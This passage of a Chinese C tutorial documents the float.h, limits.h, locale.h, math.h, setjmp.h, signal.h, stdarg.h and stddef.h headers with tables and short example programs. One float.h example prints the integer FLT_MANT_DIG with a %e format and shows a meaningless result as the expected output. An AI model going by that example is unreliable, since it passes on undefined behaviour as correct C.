<td align="left">这些宏定义了基数为 10 时的指数的最大整数值。</td>
</tr>
<tr>
<td align="left">FLT_MAX 1E+37DBL_MAX 1E+37LDBL_MAX 1E+37</td>
<td align="left">这些宏定义最大的有限浮点值。</td>
</tr>
<tr>
<td align="left">FLT_EPSILON 1E-5DBL_EPSILON 1E-9LDBL_EPSILON 1E-9</td>
<td align="left">这些宏定义了可表示的最小有效数字。</td>
</tr>
<tr>
<td align="left">FLT_MIN 1E-37DBL_MIN 1E-37LDBL_MIN 1E-37</td>
<td align="left">这些宏定义了最小的浮点值。</td>
</tr>
</tbody></table>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>下面的实例演示了 float.h 文件中定义的一些常量的使用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;float.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The maximum value of float = %.10e\n&quot;</span>, FLT_MAX);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The minimum value of float = %.10e\n&quot;</span>, FLT_MIN);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The number of digits in the number = %.10e\n&quot;</span>, FLT_MANT_DIG);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我们编译和运行上面的程序，这将产生下列结果：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">The maximum value of <span class="type">float</span> = <span class="number">3.4028234664e+38</span></span><br><span class="line">The minimum value of <span class="type">float</span> = <span class="number">1.1754943508e-38</span></span><br><span class="line">The number of digits in the number = <span class="number">7.2996655210e-312</span></span><br></pre></td></tr></table></figure>

<h1 id="C-标准库-lt-limits-h-gt"><a href="#C-标准库-lt-limits-h-gt" class="headerlink" title="C 标准库 - &lt;limits.h&gt;"></a>C 标准库 - &lt;limits.h&gt;</h1><h2 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h2><p><strong>limits.h</strong> 头文件决定了各种变量类型的各种属性。定义在该头文件中的宏限制了各种变量类型（比如 char、int 和 long）的值。</p>
<p>这些限制指定了变量不能存储任何超出这些限制的值，例如一个无符号可以存储的最大值是 255。</p>
<h2 id="库宏-3"><a href="#库宏-3" class="headerlink" title="库宏"></a>库宏</h2><p>下面的值是特定实现的，且是通过 #define 指令来定义的，这些值都不得低于下边所给出的值。</p>
<table>
<thead>
<tr>
<th align="left">宏</th>
<th align="left">值</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CHAR_BIT</td>
<td align="left">8</td>
<td align="left">定义一个字节的比特数。</td>
</tr>
<tr>
<td align="left">SCHAR_MIN</td>
<td align="left">-128</td>
<td align="left">定义一个有符号字符的最小值。</td>
</tr>
<tr>
<td align="left">SCHAR_MAX</td>
<td align="left">127</td>
<td align="left">定义一个有符号字符的最大值。</td>
</tr>
<tr>
<td align="left">UCHAR_MAX</td>
<td align="left">255</td>
<td align="left">定义一个无符号字符的最大值。</td>
</tr>
<tr>
<td align="left">CHAR_MIN</td>
<td align="left">0</td>
<td align="left">定义类型 char 的最小值，如果 char 表示负值，则它的值等于 SCHAR_MIN，否则等于 0。</td>
</tr>
<tr>
<td align="left">CHAR_MAX</td>
<td align="left">127</td>
<td align="left">定义类型 char 的最大值，如果 char 表示负值，则它的值等于 SCHAR_MAX，否则等于 UCHAR_MAX。</td>
</tr>
<tr>
<td align="left">MB_LEN_MAX</td>
<td align="left">1</td>
<td align="left">定义多字节字符中的最大字节数。</td>
</tr>
<tr>
<td align="left">SHRT_MIN</td>
<td align="left">-32768</td>
<td align="left">定义一个短整型的最小值。</td>
</tr>
<tr>
<td align="left">SHRT_MAX</td>
<td align="left">+32767</td>
<td align="left">定义一个短整型的最大值。</td>
</tr>
<tr>
<td align="left">USHRT_MAX</td>
<td align="left">65535</td>
<td align="left">定义一个无符号短整型的最大值。</td>
</tr>
<tr>
<td align="left">INT_MIN</td>
<td align="left">-32768</td>
<td align="left">定义一个整型的最小值。</td>
</tr>
<tr>
<td align="left">INT_MAX</td>
<td align="left">+32767</td>
<td align="left">定义一个整型的最大值。</td>
</tr>
<tr>
<td align="left">UINT_MAX</td>
<td align="left">65535</td>
<td align="left">定义一个无符号整型的最大值。</td>
</tr>
<tr>
<td align="left">LONG_MIN</td>
<td align="left">-2147483648</td>
<td align="left">定义一个长整型的最小值。</td>
</tr>
<tr>
<td align="left">LONG_MAX</td>
<td align="left">+2147483647</td>
<td align="left">定义一个长整型的最大值。</td>
</tr>
<tr>
<td align="left">ULONG_MAX</td>
<td align="left">4294967295</td>
<td align="left">定义一个无符号长整型的最大值。</td>
</tr>
</tbody></table>
<h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><p>下面的实例演示了 limit.h 文件中定义的一些常量的使用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The number of bits in a byte %d\n&quot;</span>, CHAR_BIT);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The minimum value of SIGNED CHAR = %d\n&quot;</span>, SCHAR_MIN);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The maximum value of SIGNED CHAR = %d\n&quot;</span>, SCHAR_MAX);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The maximum value of UNSIGNED CHAR = %d\n&quot;</span>, UCHAR_MAX);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The minimum value of SHORT INT = %d\n&quot;</span>, SHRT_MIN);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The maximum value of SHORT INT = %d\n&quot;</span>, SHRT_MAX); </span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The minimum value of INT = %d\n&quot;</span>, INT_MIN);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The maximum value of INT = %d\n&quot;</span>, INT_MAX);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The minimum value of CHAR = %d\n&quot;</span>, CHAR_MIN);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The maximum value of CHAR = %d\n&quot;</span>, CHAR_MAX);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The minimum value of LONG = %ld\n&quot;</span>, LONG_MIN);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The maximum value of LONG = %ld\n&quot;</span>, LONG_MAX);</span><br><span class="line">  </span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我们编译和运行上面的程序，这将产生下列结果：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">The number of bits in a byte <span class="number">8</span></span><br><span class="line">The minimum value of SIGNED CHAR = <span class="number">-128</span></span><br><span class="line">The maximum value of SIGNED CHAR = <span class="number">127</span></span><br><span class="line">The maximum value of UNSIGNED CHAR = <span class="number">255</span></span><br><span class="line">The minimum value of SHORT INT = <span class="number">-32768</span></span><br><span class="line">The maximum value of SHORT INT = <span class="number">32767</span></span><br><span class="line">The minimum value of INT = <span class="number">-32768</span></span><br><span class="line">The maximum value of INT = <span class="number">32767</span></span><br><span class="line">The minimum value of CHAR = <span class="number">-128</span></span><br><span class="line">The maximum value of CHAR = <span class="number">127</span></span><br><span class="line">The minimum value of LONG = <span class="number">-2147483648</span></span><br><span class="line">The maximum value of LONG = <span class="number">2147483647</span></span><br></pre></td></tr></table></figure>

<h1 id="C-标准库-lt-locale-h-gt"><a href="#C-标准库-lt-locale-h-gt" class="headerlink" title="C 标准库 - &lt;locale.h&gt;"></a>C 标准库 - &lt;locale.h&gt;</h1><h2 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h2><p><strong>locale.h</strong> 头文件定义了特定地域的设置，比如日期格式和货币符号。接下来我们将介绍一些宏，以及一个重要的结构 <strong>struct lconv</strong> 和两个重要的函数。</p>
<h2 id="库宏-4"><a href="#库宏-4" class="headerlink" title="库宏"></a>库宏</h2><p>下面列出了头文件 locale.h 中定义的宏，这些宏将在下列的两个函数中使用：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">宏 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>LC_ALL</strong> 设置下面的所有选项。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>LC_COLLATE</strong> 影响 strcoll 和 strxfrm 函数。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>LC_CTYPE</strong> 影响所有字符函数。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>LC_MONETARY</strong> 影响 localeconv 函数提供的货币信息。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><strong>LC_NUMERIC</strong> 影响 localeconv 函数提供的小数点格式化和信息。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><strong>LC_TIME</strong> 影响 strftime 函数。</td>
</tr>
</tbody></table>
<h2 id="库函数-1"><a href="#库函数-1" class="headerlink" title="库函数"></a>库函数</h2><p>下面列出了头文件 locale.h 中定义的函数：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-setlocale.html">char *setlocale(int category, const char *locale)</a> 设置或读取地域化信息。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-localeconv.html">struct lconv *localeconv(void)</a> 设置或读取地域化信息。</td>
</tr>
</tbody></table>
<h2 id="库结构"><a href="#库结构" class="headerlink" title="库结构"></a>库结构</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">   <span class="type">char</span> *decimal_point;</span><br><span class="line">   <span class="type">char</span> *thousands_sep;</span><br><span class="line">   <span class="type">char</span> *grouping;    </span><br><span class="line">   <span class="type">char</span> *int_curr_symbol;</span><br><span class="line">   <span class="type">char</span> *currency_symbol;</span><br><span class="line">   <span class="type">char</span> *mon_decimal_point;</span><br><span class="line">   <span class="type">char</span> *mon_thousands_sep;</span><br><span class="line">   <span class="type">char</span> *mon_grouping;</span><br><span class="line">   <span class="type">char</span> *positive_sign;</span><br><span class="line">   <span class="type">char</span> *negative_sign;</span><br><span class="line">   <span class="type">char</span> int_frac_digits;</span><br><span class="line">   <span class="type">char</span> frac_digits;</span><br><span class="line">   <span class="type">char</span> p_cs_precedes;</span><br><span class="line">   <span class="type">char</span> p_sep_by_space;</span><br><span class="line">   <span class="type">char</span> n_cs_precedes;</span><br><span class="line">   <span class="type">char</span> n_sep_by_space;</span><br><span class="line">   <span class="type">char</span> p_sign_posn;</span><br><span class="line">   <span class="type">char</span> n_sign_posn;</span><br><span class="line">&#125; lconv</span><br></pre></td></tr></table></figure>

<p>以下是各字段的描述：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">字段 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>decimal_point</strong> 用于非货币值的小数点字符。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>thousands_sep</strong> 用于非货币值的千位分隔符。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>grouping</strong> 一个表示非货币量中每组数字大小的字符串。每个字符代表一个整数值，每个整数指定当前组的位数。值为 0 意味着前一个值将应用于剩余的分组。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>int_curr_symbol</strong> 国际货币符号使用的字符串。前三个字符是由 ISO 4217:1987 指定的，第四个字符用于分隔货币符号和货币量。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><strong>currency_symbol</strong> 用于货币的本地符号。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><strong>mon_decimal_point</strong> 用于货币值的小数点字符。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left"><strong>mon_thousands_sep</strong> 用于货币值的千位分隔符。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left"><strong>mon_grouping</strong> 一个表示货币值中每组数字大小的字符串。每个字符代表一个整数值，每个整数指定当前组的位数。值为 0 意味着前一个值将应用于剩余的分组。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left"><strong>positive_sign</strong> 用于正货币值的字符。</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left"><strong>negative_sign</strong> 用于负货币值的字符。</td>
</tr>
<tr>
<td align="left">11</td>
<td align="left"><strong>int_frac_digits</strong> 国际货币值中小数点后要显示的位数。</td>
</tr>
<tr>
<td align="left">12</td>
<td align="left"><strong>frac_digits</strong> 货币值中小数点后要显示的位数。</td>
</tr>
<tr>
<td align="left">13</td>
<td align="left"><strong>p_cs_precedes</strong> 如果等于 1，则 currency_symbol 出现在正货币值之前。如果等于 0，则 currency_symbol 出现在正货币值之后。</td>
</tr>
<tr>
<td align="left">14</td>
<td align="left"><strong>p_sep_by_space</strong> 如果等于 1，则 currency_symbol 和正货币值之间使用空格分隔。如果等于 0，则 currency_symbol 和正货币值之间不使用空格分隔。</td>
</tr>
<tr>
<td align="left">15</td>
<td align="left"><strong>n_cs_precedes</strong> 如果等于 1，则 currency_symbol 出现在负货币值之前。如果等于 0，则 currency_symbol 出现在负货币值之后。</td>
</tr>
<tr>
<td align="left">16</td>
<td align="left"><strong>n_sep_by_space</strong> 如果等于 1，则 currency_symbol 和负货币值之间使用空格分隔。如果等于 0，则 currency_symbol 和负货币值之间不使用空格分隔。</td>
</tr>
<tr>
<td align="left">17</td>
<td align="left"><strong>p_sign_posn</strong> 表示正货币值中正号的位置。</td>
</tr>
<tr>
<td align="left">18</td>
<td align="left"><strong>n_sign_posn</strong> 表示负货币值中负号的位置。</td>
</tr>
</tbody></table>
<p>下面的值用于 <strong>p_sign_posn</strong> 和 <strong>n_sign_posn</strong>:</p>
<table>
<thead>
<tr>
<th align="left">值</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0</td>
<td align="left">封装值和 currency_symbol 的括号。</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">放置在值和 currency_symbol 之前的符号。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">放置在值和 currency_symbol 之后的符号。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">紧挨着放置在值和 currency_symbol 之前的符号。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">紧挨着放置在值和 currency_symbol 之后的符号。</td>
</tr>
</tbody></table>
<h1 id="C-标准库-lt-math-h-gt"><a href="#C-标准库-lt-math-h-gt" class="headerlink" title="C 标准库 - &lt;math.h&gt;"></a>C 标准库 - &lt;math.h&gt;</h1><h2 id="简介-6"><a href="#简介-6" class="headerlink" title="简介"></a>简介</h2><p><strong>math.h</strong> 头文件定义了各种数学函数和一个宏。在这个库中所有可用的功能都带有一个 <strong>double</strong> 类型的参数，且都返回 <strong>double</strong> 类型的结果。</p>
<h2 id="库宏-5"><a href="#库宏-5" class="headerlink" title="库宏"></a>库宏</h2><p>下面是这个库中定义的唯一的一个宏：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">宏 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>HUGE_VAL</strong> 当函数的结果不可以表示为浮点数时。如果是因为结果的幅度太大以致于无法表示，则函数会设置 errno 为 ERANGE 来表示范围错误，并返回一个由宏 HUGE_VAL 或者它的否定（- HUGE_VAL）命名的一个特定的很大的值。如果结果的幅度太小，则会返回零值。在这种情况下，error 可能会被设置为 ERANGE，也有可能不会被设置为 ERANGE。</td>
</tr>
</tbody></table>
<h2 id="库函数-2"><a href="#库函数-2" class="headerlink" title="库函数"></a>库函数</h2><p>下面列出了头文件 math.h 中定义的函数：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-acos.html">double acos(double x)</a> 返回以弧度表示的 x 的反余弦。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-asin.html">double asin(double x)</a> 返回以弧度表示的 x 的反正弦。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-atan.html">double atan(double x)</a> 返回以弧度表示的 x 的反正切。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-atan2.html">double atan2(double y, double x)</a> 返回以弧度表示的 y&#x2F;x 的反正切。y 和 x 的值的符号决定了正确的象限。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-cos.html">double cos(double x)</a> 返回弧度角 x 的余弦。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-cosh.html">double cosh(double x)</a> 返回 x 的双曲余弦。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-sin.html">double sin(double x)</a> 返回弧度角 x 的正弦。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-sinh.html">double sinh(double x)</a> 返回 x 的双曲正弦。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-tanh.html">double tanh(double x)</a> 返回 x 的双曲正切。</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-exp.html">double exp(double x)</a> 返回 e 的 x 次幂的值。</td>
</tr>
<tr>
<td align="left">11</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-frexp.html">double frexp(double x, int *exponent)</a> 把浮点数 x 分解成尾数和指数。返回值是尾数，并将指数存入 exponent 中。所得的值是 x &#x3D; mantissa * 2 ^ exponent。</td>
</tr>
<tr>
<td align="left">12</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-ldexp.html">double ldexp(double x, int exponent)</a> 返回 x 乘以 2 的 exponent 次幂。</td>
</tr>
<tr>
<td align="left">13</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-log.html">double log(double x)</a> 返回 x 的自然对数（基数为 e 的对数）。</td>
</tr>
<tr>
<td align="left">14</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-log10.html">double log10(double x)</a> 返回 x 的常用对数（基数为 10 的对数）。</td>
</tr>
<tr>
<td align="left">15</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-modf.html">double modf(double x, double *integer)</a> 返回值为小数部分（小数点后的部分），并设置 integer 为整数部分。</td>
</tr>
<tr>
<td align="left">16</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-pow.html">double pow(double x, double y)</a> 返回 x 的 y 次幂。</td>
</tr>
<tr>
<td align="left">17</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-sqrt.html">double sqrt(double x)</a> 返回 x 的平方根。</td>
</tr>
<tr>
<td align="left">18</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-ceil.html">double ceil(double x)</a> 返回大于或等于 x 的最小的整数值。</td>
</tr>
<tr>
<td align="left">19</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fabs.html">double fabs(double x)</a> 返回 x 的绝对值。</td>
</tr>
<tr>
<td align="left">20</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-floor.html">double floor(double x)</a> 返回小于或等于 x 的最大的整数值。</td>
</tr>
<tr>
<td align="left">21</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fmod.html">double fmod(double x, double y)</a> 返回 x 除以 y 的余数。</td>
</tr>
</tbody></table>
<h1 id="C-标准库-lt-setjmp-h-gt"><a href="#C-标准库-lt-setjmp-h-gt" class="headerlink" title="C 标准库 - &lt;setjmp.h&gt;"></a>C 标准库 - &lt;setjmp.h&gt;</h1><h2 id="简介-7"><a href="#简介-7" class="headerlink" title="简介"></a>简介</h2><p><strong>setjmp.h</strong> 头文件定义了宏 **setjmp()**、函数 <strong>longjmp()</strong> 和变量类型 <strong>jmp_buf</strong>，该变量类型会绕过正常的函数调用和返回规则。</p>
<h2 id="库变量"><a href="#库变量" class="headerlink" title="库变量"></a>库变量</h2><p>下面列出了头文件 setjmp.h 中定义的变量：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">变量 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>jmp_buf</strong>  这是一个用于存储宏 <strong>setjmp()</strong> 和函数 <strong>longjmp()</strong> 相关信息的数组类型。</td>
</tr>
</tbody></table>
<h2 id="库宏-6"><a href="#库宏-6" class="headerlink" title="库宏"></a>库宏</h2><p>下面是这个库中定义的唯一的一个宏：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">宏 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-macro-setjmp.html">int setjmp(jmp_buf environment)</a> 这个宏把当前环境保存在变量 <strong>environment</strong> 中，以便函数 <strong>longjmp()</strong> 后续使用。如果这个宏直接从宏调用中返回，则它会返回零，但是如果它从 <strong>longjmp()</strong> 函数调用中返回，则它会返回一个非零值。</td>
</tr>
</tbody></table>
<h2 id="库函数-3"><a href="#库函数-3" class="headerlink" title="库函数"></a>库函数</h2><p>下面是头文件 setjmp.h 中定义的唯一的一个函数：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-longjmp.html">void longjmp(jmp_buf environment, int value)</a> 该函数恢复最近一次调用 <strong>setjmp()</strong> 宏时保存的环境，<strong>jmp_buf</strong> 参数的设置是由之前调用 setjmp() 生成的。</td>
</tr>
</tbody></table>
<h1 id="C-标准库-lt-signal-h-gt"><a href="#C-标准库-lt-signal-h-gt" class="headerlink" title="C 标准库 - &lt;signal.h&gt;"></a>C 标准库 - &lt;signal.h&gt;</h1><h2 id="简介-8"><a href="#简介-8" class="headerlink" title="简介"></a>简介</h2><p><strong>signal.h</strong> 头文件定义了一个变量类型 <strong>sig_atomic_t</strong>、两个函数调用和一些宏来处理程序执行期间报告的不同信号。</p>
<h2 id="库变量-1"><a href="#库变量-1" class="headerlink" title="库变量"></a>库变量</h2><p>下面是头文件 signal.h 中定义的变量类型：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">变量 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>sig_atomic_t</strong>  这是 <strong>int</strong> 类型，在信号处理程序中作为变量使用。它是一个对象的整数类型，该对象可以作为一个原子实体访问，即使存在异步信号时，该对象可以作为一个原子实体访问。</td>
</tr>
</tbody></table>
<h2 id="库宏-7"><a href="#库宏-7" class="headerlink" title="库宏"></a>库宏</h2><p>下面是头文件 signal.h 中定义的宏，这些宏将在下列两个函数中使用。<strong>SIG_</strong> 宏与 signal 函数一起使用来定义信号的功能。</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">宏 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>SIG_DFL</strong> 默认的信号处理程序。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>SIG_ERR</strong> 表示一个信号错误。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>SIG_IGN</strong> 忽视信号。</td>
</tr>
</tbody></table>
<p><strong>SIG</strong> 宏用于表示以下各种条件的信号码：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">宏 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>SIGABRT</strong> 程序异常终止。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>SIGFPE</strong> 算术运算出错，如除数为 0 或溢出。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>SIGILL</strong> 非法函数映象，如非法指令。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>SIGINT</strong> 中断信号，如 ctrl-C。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><strong>SIGSEGV</strong> 非法访问存储器，如访问不存在的内存单元。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><strong>SIGTERM</strong> 发送给本程序的终止请求信号。</td>
</tr>
</tbody></table>
<h2 id="库函数-4"><a href="#库函数-4" class="headerlink" title="库函数"></a>库函数</h2><p>下面是头文件 signal.h 中定义的函数：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-signal.html">void (*signal(int sig, void (*func)(int)))(int)</a> 该函数设置一个函数来处理信号，即信号处理程序。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-raise.html">int raise(int sig)</a> 该函数会促使生成信号 <strong>sig</strong>。sig 参数与 SIG 宏兼容。</td>
</tr>
</tbody></table>
<h1 id="C-标准库-lt-stdarg-h-gt"><a href="#C-标准库-lt-stdarg-h-gt" class="headerlink" title="C 标准库 - &lt;stdarg.h&gt;"></a>C 标准库 - &lt;stdarg.h&gt;</h1><h2 id="简介-9"><a href="#简介-9" class="headerlink" title="简介"></a>简介</h2><p><strong>stdarg.h</strong> 头文件定义了一个变量类型 <strong>va_list</strong> 和三个宏，这三个宏可用于在参数个数未知（即参数个数可变）时获取函数中的参数。</p>
<p>可变参数的函数通在参数列表的末尾是使用省略号(,…)定义的。</p>
<h2 id="库变量-2"><a href="#库变量-2" class="headerlink" title="库变量"></a>库变量</h2><p>下面是头文件 stdarg.h 中定义的变量类型：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">变量 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>va_list</strong>  这是一个适用于 <strong>va_start()、va_arg()</strong> 和 <strong>va_end()</strong> 这三个宏存储信息的类型。</td>
</tr>
</tbody></table>
<h2 id="库宏-8"><a href="#库宏-8" class="headerlink" title="库宏"></a>库宏</h2><p>下面是头文件 stdarg.h 中定义的宏：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">宏 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-macro-va_start.html">void va_start(va_list ap, last_arg)</a> 这个宏初始化 <strong>ap</strong> 变量，它与 <strong>va_arg</strong> 和 <strong>va_end</strong> 宏是一起使用的。<strong>last_arg</strong> 是最后一个传递给函数的已知的固定参数，即省略号之前的参数。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-macro-va_arg.html">type va_arg(va_list ap, type)</a> 这个宏检索函数参数列表中类型为 <strong>type</strong> 的下一个参数。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-macro-va_end.html">void va_end(va_list ap)</a> 这个宏允许使用了 <strong>va_start</strong> 宏的带有可变参数的函数返回。如果在从函数返回之前没有调用 <strong>va_end</strong>，则结果为未定义。</td>
</tr>
</tbody></table>
<h1 id="C-标准库-lt-stddef-h-gt"><a href="#C-标准库-lt-stddef-h-gt" class="headerlink" title="C 标准库 - &lt;stddef.h&gt;"></a>C 标准库 - &lt;stddef.h&gt;</h1><h2 id="简介-10"><a href="#简介-10" class="headerlink" title="简介"></a>简介</h2><p><strong>stddef .h</strong> 头文件定义了各种变量类型和宏。这些定义中的大部分也出现在其它头文件中。</p>
<h2 id="库变量-3"><a href="#库变量-3" class="headerlink" title="库变量"></a>库变量</h2><p>下面是头文件 stddef.h 中定义的变量类型：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">变量 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>ptrdiff_t</strong> 这是有符号整数类型，它是两个指针相减的结果。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>size_t</strong>  这是无符号整数类型，它是 <strong>sizeof</strong> 关键字的结果。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>wchar_t</strong>  这是一个宽字符常量大小的整数类型。</td>
</tr>
</tbody></table>
